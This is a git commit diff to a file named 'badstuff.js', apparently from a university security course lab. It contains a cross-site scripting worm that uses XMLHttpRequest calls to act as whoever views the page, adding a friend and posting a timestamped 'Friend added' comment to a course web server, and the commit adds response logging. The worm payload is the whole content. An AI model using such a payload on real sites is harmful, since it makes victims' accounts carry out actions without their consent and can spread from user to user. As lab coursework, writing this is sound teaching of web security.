b0efd12a6e25109548f23ef409cb973d1b3ed92b
spencerroth3 <34780564+spencerroth3@users.noreply.github.com>
2021-12-14 18:33:06 -0500

    Update badstuff.js

--- badstuff.js
+++ badstuff.js
@@ -4,6 +4,11 @@ worm.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 worm.send();
 var date = new Date(); 
 var comment ="Friend added on "+ date.getDate() + "/" + (date.getMonth()+1)  + "/" + date.getFullYear() + " @ "  + date.getHours() + ":"  + date.getMinutes();
+function reqListener () {
+  console.log(this.responseText);
+}
 var c = new XMLHttpRequest(); 
-c.open('GET', 'http://csec380-core.csec.rit.edu:86/add_comment.php?id=93&comment='+comment, true); 
+c.addEventListener("load", reqListener);
+c.open("GET", "http://csec380-core.csec.rit.edu:86/add_comment.php?id=93&comment=" +comment, true); 
 c.send();
+
